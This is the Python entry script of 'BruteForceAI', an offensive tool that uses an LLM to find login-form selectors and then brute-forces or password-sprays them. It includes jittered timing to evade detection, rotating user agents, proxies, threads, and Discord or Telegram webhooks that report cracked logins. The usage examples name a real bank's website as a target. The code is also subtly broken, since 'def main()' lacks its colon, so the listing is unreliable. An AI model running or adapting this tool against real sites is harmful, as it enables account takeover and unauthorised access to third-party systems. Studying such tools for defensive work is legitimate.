# -*- coding: utf-8-sig -*-

"""
BruteForceAI Main Script
AI-Powered login form analysis and brute force attack tool using LLM
"""

from BruteForceCore import BruteForceAI, print_banner, check_for_updates
import argparse
import sys
import os
from datetime import datetime

class OutputCapture:
    """Capture all output to both console and file"""
    def __init__(self, filename):
        self.filename = filename
        self.file = None
        self.original_stdout = sys.stdout
        self.original_stderr = sys.stderr
        
    def start(self):
        """Start capturing output"""
        try:
            self.file = open(self.filename, 'w', encoding='utf-8-sig')
            sys.stdout = self
            sys.stderr = self
            return True
        except Exception as e:
            print(f"❌ Error opening output file {self.filename}: {e}")
            return False
    
    def stop(self):
        """Stop capturing output"""
        if self.file:
            sys.stdout = self.original_stdout
            sys.stderr = self.original_stderr
            self.file.close()
            print(f"📄 Output saved to: {self.filename}")
    
    def write(self, text):
        """Write to both console and file"""
        self.original_stdout.write(text)
        if self.file:
            self.file.write(text)
            self.file.flush()  # Ensure immediate write
    
    def flush(self):
        """Flush both outputs"""
        self.original_stdout.flush()
        if self.file:
            self.file.flush()

def main()
    parser = argparse.ArgumentParser(
        description='BruteForceAI - AI-Powered Login Form Analysis and Brute Force Attack Tool using LLM',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Analyze - Analyze login forms (simplest - uses default ollama + llama3.2:3b)
  python BruteForceAI.py analyze --urls urls.txt

  # Analyze - Analyze login forms (with default models)
  python BruteForceAI.py analyze www.equitybankgroup.co.ke
  urls.txt --llm-provider ollama
  python BruteForceAI.py analyze --urls urls.txt --llm-provider groq --llm-api-key "your_api_key"

  # Analyze - Analyze login forms (with specific models)
  python BruteForceAI.py analyze --urls urls.txt --llm-provider ollama --llm-model llama3.2:3b
  python BruteForceAI.py analyze --urls urls.txt --llm-provider groq --llm-model llama-3.1-70b-versatile --llm-api-key "your_api_key"
  
  # Analyze - Custom Ollama server
  python BruteForceAI.py analyze --urls urls.txt --llm-provider ollama --ollama-url http://192.168.1.100:11434

  # Attack - Brute force attack
  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt

  # Attack - Password spray with threads
  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --mode passwordspray --threads 3

  # Attack with Discord webhook notifications
  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --discord-webhook "https://discord.com/api/webhooks/..."

  # Attack with Telegram notifications
  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --telegram-webhook "BOT_TOKEN" --telegram-chat-id "CHAT_ID"

  # Attack with multiple webhooks
  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --discord-webhook "..." --slack-webhook "..."

  # Save output to file
  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --output results.txt

  # Clean database
  python BruteForceAI.py clean-db

  # Check for updates
  python BruteForceAI.py check-updates

  # Skip version check for faster startup
  python BruteForceAI.py attack --urls urls.txt --usernames usernames.txt --passwords passwords.txt --skip-version-check
        """
    )
    
    # Global arguments
    parser.add_argument('--no-color', '-nc', action='store_true', help='Disable colored output')
    parser.add_argument('--output', '-o', help='Save all output to file (from start to finish)')
    parser.add_argument('--skip-version-check', action='store_true', help='Skip automatic version checking')
    
    # Add subcommands
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Analyze subcommand (formerly stage1)
    analyze_parser = subparsers.add_parser('analyze', help='Analyze login forms and identify selectors')
    analyze_parser.add_argument('--urls', required=True, help='File containing URLs (one per line)')
    analyze_parser.add_argument('--llm-provider', choices=['ollama', 'groq'], help='LLM provider for analysis (default: ollama)')
    analyze_parser.add_argument('--llm-model', help='LLM model name (default: llama3.2:3b for Ollama, llama-3.3-70b-versatile for Groq)')
    analyze_parser.add_argument('--llm-api-key', help='API key for Groq (not needed for Ollama)')
    analyze_parser.add_argument('--ollama-url', help='Ollama server URL (default: http://localhost:11434)')
    analyze_parser.add_argument('--selector-retry', type=int, default=10, help='Number of retry attempts for selectors')
    analyze_parser.add_argument('--show-browser', action='store_true', help='Show browser window during analysis')
    analyze_parser.add_argument('--browser-wait', type=int, default=0, help='Wait time in seconds when browser is visible')
    analyze_parser.add_argument('--proxy', help='Proxy server (e.g., http://127.0.0.1:8080)')
    analyze_parser.add_argument('--database', default='bruteforce.db', help='SQLite database file path')
    analyze_parser.add_argument('--force-reanalyze', action='store_true', help='Force re-analysis even if selectors exist')
    analyze_parser.add_argument('--debug', action='store_true', help='Enable debug output')
    analyze_parser.add_argument('--user-agents', help='File containing User-Agent strings (one per line) for random selection')
    analyze_parser.add_argument('--output', '-o', help='Save all output to file (from start to finish)')
    analyze_parser.add_argument('--no-color', '-nc', action='store_true', help='Disable colored output')
    analyze_parser.add_argument('--skip-version-check', action='store_true', help='Skip automatic version checking')
    
    # Attack subcommand (formerly stage2)
    attack_parser = subparsers.add_parser('attack', help='Execute login attacks using analyzed selectors')
    attack_parser.add_argument('--urls', required=True, help='File containing URLs (one per line)')
    attack_parser.add_argument('--usernames', required=True, help='File containing usernames (one per line)')
    attack_parser.add_argument('--passwords', required=True, help='File containing passwords (one per line)')
    attack_parser.add_argument('--mode', choices=['bruteforce', 'passwordspray'], default='bruteforce',
                              help='Attack mode: bruteforce (all combinations) or passwordspray (each password against all users)')
    attack_parser.add_argument('--attack', choices=['playwright'], default='playwright',
                              help='Attack method (only playwright supported)')
    attack_parser.add_argument('--threads', type=int, default=1,
                              help='Number of threads to use for parallel attacks')
    attack_parser.add_argument('--retry-attempts', type=int, default=3,
                              help='Number of retry attempts for network errors (default: 3)')
    attack_parser.add_argument('--dom-threshold', type=int, default=100,
                              help='DOM length difference threshold for success detection (default: 100)')
    attack_parser.add_argument('--delay', type=float, default=0,
                              help='Delay in seconds between attempts (bruteforce: between passwords for same user, passwordspray: between passwords)')
    attack_parser.add_argument('--jitter', type=float, default=0,
                              help='Random jitter in seconds to add to delays (0-jitter range) for more human-like timing')
    attack_parser.add_argument('--success-exit', action='store_true',
                              help='Stop attack for each URL after first successful login is found')
    attack_parser.add_argument('--user-agents', 
                              help='File containing User-Agent strings (one per line) for random selection')
    attack_parser.add_argument('--show-browser', action='store_true', help='Show browser window during attacks')
    attack_parser.add_argument('--browser-wait', type=int, default=0, help='Wait time in seconds when browser is visible')
    attack_parser.add_argument('--proxy', help='Proxy server (e.g., http://127.0.0.1:8080)')
    attack_parser.add_argument('--database', default='bruteforce.db', help='SQLite database file path')
    attack_parser.add_argument('--debug', action='store_true', help='Enable debug output')
    attack_parser.add_argument('--verbose', action='store_true', help='Show detailed timestamps for each attempt')
    attack_parser.add_argument('--force-retry', action='store_true', help='Force retry attempts that already exist in the database (default: skip existing)')
    attack_parser.add_argument('--output', '-o', help='Save all output to file (from start to finish)')
    attack_parser.add_argument('--no-color', '-nc', action='store_true', help='Disable colored output')
    attack_parser.add_argument('--skip-version-check', action='store_true', help='Skip automatic version checking')
    
    # Webhook notification arguments
    attack_parser.add_argument('--discord-webhook', help='Discord webhook URL for success notifications')
    attack_parser.add_argument('--slack-webhook', help='Slack webhook URL for success notifications')
    attack_parser.add_argument('--teams-webhook', help='Microsoft Teams webhook URL for success notifications')
    attack_parser.add_argument('--telegram-webhook', help='Telegram bot token for success notifications')
    attack_parser.add_argument('--telegram-chat-id', help='Telegram chat ID for notifications (required with --telegram-webhook)')
    
    # Clean database subcommand
    clean_parser = subparsers.add_parser('clean-db', help='Clean (truncate) all database tables')
    clean_parser.add_argument('--database', default='bruteforce.db', help='SQLite database file path')
    clean_parser.add_argument('--output', '-o', help='Save all output to file (from start to finish)')
    clean_parser.add_argument('--no-color', '-nc', action='store_true', help='Disable colored output')
    clean_parser.add_argument('--skip-version-check', action='store_true', help='Skip automatic version checking')
    
    # Check updates subcommand
    updates_parser = subparsers.add_parser('check-updates', help='Check for software updates')
    updates_parser.add_argument('--output', '-o', help='Save all output to file (from start to finish)')
    updates_parser.add_argument('--no-color', '-nc', action='store_true', help='Disable colored output')
    updates_parser.add_argument('--skip-version-check', action='store_true', help='Skip automatic version checking')
    
    # Parse arguments
    args = parser.parse_args()
    
    # Handle global skip-version-check flag
    # If it's a global flag, we need to check sys.argv directly
    global_skip_version_check = '--skip-version-check' in sys.argv
    
    # Setup output capture if requested (check both global and subcommand)
    output_capture = None
    output_file_arg = getattr(args, 'output', None) or args.output if hasattr(args, 'output') else None
    if output_file_arg:
        # Generate filename with timestamp if not provided with extension
        output_file = output_file_arg
        if not output_file.endswith('.txt') and not output_file.endswith('.log'):
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"{output_file}_{timestamp}.txt"
        
        output_capture = OutputCapture(output_file)
        if not output_capture.start():
            sys.exit(1)
        
        # Print initial info about output capture
        print(f"📄 Output capture started - saving to: {output_file}")
        print(f"🕐 Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)
    
    try:
        # Print banner (check both global and subcommand no-color and skip-version-check)
        no_color = getattr(args, 'no_color', False)
        skip_version_check = getattr(args, 'skip_version_check', False) or global_skip_version_check
        print_banner(no_color=no_color, check_updates=not skip_version_check)
        
        if not args.command:
            parser.print_help()
            sys.exit(1)
        
        # Execute commands
        if args.command == 'analyze':
            execute_analyze(args)
        elif args.command == 'attack':
            execute_attack(args)
        elif args.command == 'clean-db':
            execute_clean_db(args)
        elif args.command == 'check-updates':
            execute_check_updates(args)
            
    except KeyboardInterrupt:
        print("\n\n🛑 Operation interrupted by user (Ctrl+C)")
        if output_capture:
            print(f"🕐 Session ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        print(f"\n\n❌ Unexpected error: {e}")
        if output_capture:
            print(f"🕐 Session ended with error: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        raise
    finally:
        # Stop output capture
        if output_capture:
            print("\n" + "=" * 80)
            print(f"🕐 Session completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            output_capture.stop()

def execute_analyze(args):
    """Execute Analyze - Login form analysis"""
    print("🚀 BruteForceAI Analyze - Login Form Analysis")
    print("=" * 50)
    print(f"URLs file: {args.urls}")
    print(f"LLM provider: {args.llm_provider or 'None'}")
    
    # Set default provider and models if not specified
    llm_provider = args.llm_provider
    llm_model = args.llm_model
    
    # If no provider specified, default to ollama
    if not llm_provider:
        llm_provider = 'ollama'
        print(f"LLM provider: {llm_provider} (default)")
    else:
        print(f"LLM provider: {llm_provider}")
    
    # Set default model based on provider if not specified
    if not llm_model:
        if llm_provider == 'ollama':
            llm_model = 'llama3.2:3b'
            print(f"LLM model: {llm_model} (default for Ollama)")
        elif llm_provider == 'groq':
            llm_model = 'llama-3.3-70b-versatile'
            print(f"LLM model: {llm_model} (default for Groq)")
    else:
        print(f"LLM model: {llm_model}")
    
    print(f"Selector retry: {args.selector_retry}")
    print(f"Show browser: {args.show_browser}")
    print(f"Browser wait: {args.browser_wait}s")
    print(f"Proxy: {args.proxy or 'None'}")
    print(f"Database: {args.database}")
    print(f"Force reanalyze: {args.force_reanalyze}")
    print(f"Debug: {args.debug}")
    print(f"User agents: {args.user_agents or 'Default browser'}")
    print("=" * 50)
    
    # Validate LLM setup before initializing BruteForceAI
    from BruteForceCore import _validate_llm_setup
    _validate_llm_setup(llm_provider, llm_model, args.llm_api_key, args.ollama_url)
    
    # Initialize BruteForceAI
    bf = BruteForceAI(
        urls_file=args.urls,
        usernames_file=[],  # Not needed for analyze
        passwords_file=[],  # Not needed for analyze
        selector_retry=args.selector_retry,
        show_browser=args.show_browser,
        browser_wait=args.browser_wait,
        proxy=args.proxy,
        database=args.database,
        llm_provider=llm_provider,  # Use the determined provider
        llm_model=llm_model,  # Use the determined model
        llm_api_key=args.llm_api_key,
        ollama_url=args.ollama_url,
        force_reanalyze=args.force_reanalyze,
        debug=args.debug,
        user_agents_file=args.user_agents
    )
    
    # Execute Stage 1 for each URL
    print(f"\n🚀 Starting analysis of {len(bf.urls)} URL(s)...")
    
    for i, url in enumerate(bf.urls, 1):
        print(f"\n[{i}/{len(bf.urls)}] Analyzing: {url}")
        result = bf.stage1(url)
        
        if result and result.get('success'):
            print(f"✅ Analysis completed successfully for {url}")
        else:
            print(f"❌ Analysis failed for {url}")
    
    print("\n✅ Analyze completed!")

def execute_attack(args):
    """Execute Attack - Login attacks"""
    print("🚀 BruteForceAI Attack - Login Attacks")
    print("=" * 80)
    print(f"Mode: {args.mode}")
    print(f"Attack method: {args.attack}")
    print(f"Threads: {args.threads}")
    print(f"Retry attempts: {args.retry_attempts}")
    print(f"DOM threshold: {args.dom_threshold}")
    print(f"Delay: {args.delay}s")
    print(f"Jitter: {args.jitter}s")
    print(f"Success exit: {args.success_exit}")
    print(f"User agents: {args.user_agents or 'Default browser'}")
    print(f"URLs file: {args.urls}")
    print(f"Usernames file: {args.usernames}")
    print(f"Passwords file: {args.passwords}")
    print(f"Database: {args.database}")
    print(f"Show browser: {args.show_browser}")
    print(f"Browser wait: {args.browser_wait}s")
    print(f"Proxy: {args.proxy or 'None'}")
    print(f"Debug: {args.debug}")
    print(f"Verbose: {args.verbose}")
    print(f"Force retry: {args.force_retry}")
    
    # Print webhook configuration
    webhooks_configured = []
    if getattr(args, 'discord_webhook', None):
        webhooks_configured.append("Discord")
    if getattr(args, 'slack_webhook', None):
        webhooks_configured.append("Slack")
    if getattr(args, 'teams_webhook', None):
        webhooks_configured.append("Teams")
    if getattr(args, 'telegram_webhook', None) and getattr(args, 'telegram_chat_id', None):
        webhooks_configured.append("Telegram")
    
    if webhooks_configured:
        print(f"Webhooks: {', '.join(webhooks_configured)}")
    else:
        print(f"Webhooks: None")
    
    print("=" * 80)
    
    # Initialize BruteForceAI
    bf = BruteForceAI(
        urls_file=args.urls,
        usernames_file=args.usernames,
        passwords_file=args.passwords,
        show_browser=args.show_browser,
        browser_wait=args.browser_wait,
        proxy=args.proxy,
        database=args.database,
        debug=args.debug,
        retry_attempts=args.retry_attempts,
        dom_threshold=args.dom_threshold,
        verbose=args.verbose,
        delay=args.delay,
        jitter=args.jitter,
        success_exit=args.success_exit,
        user_agents_file=args.user_agents,
        force_retry=args.force_retry,
        discord_webhook=getattr(args, 'discord_webhook', None),
        slack_webhook=getattr(args, 'slack_webhook', None),
        teams_webhook=getattr(args, 'teams_webhook', None),
        telegram_webhook=getattr(args, 'telegram_webhook', None),
        telegram_chat_id=getattr(args, 'telegram_chat_id', None),
        ollama_url=getattr(args, 'ollama_url', None)
    )
    
    # Execute Stage 2
    bf.stage2(
        mode=args.mode,
        attack=args.attack,
        threads=args.threads
    )
    
    print("\n✅ Attack completed!")

def execute_clean_db(args):
    """Clean database tables"""
    print("🧹 BruteForceAI Database Cleanup")
    print("=" * 50)
    print(f"Database: {args.database}")
    print("=" * 50)
    
    # Initialize BruteForceAI just for database operations
    bf = BruteForceAI(
        urls_file=[],
        usernames_file=[],
        passwords_file=[],
        database=args.database
    )
    
    # Clean database
    bf.clean_database()

def execute_check_updates(args):
    """Execute Check Updates"""
    print("🔄 BruteForceAI Update Check")
    print("=" * 50)
    
    # Check for updates (force=True for manual checks)
    result = check_for_updates(silent=False, force=True)
    
    if result is None:
        print("❌ Update check failed")
    elif result.get('update_available'):
        print("🎉 Update check completed - update available!")
    else:
        print("✅ Update check completed - you're up to date!")

if __name__ == "__main__":
    main() 
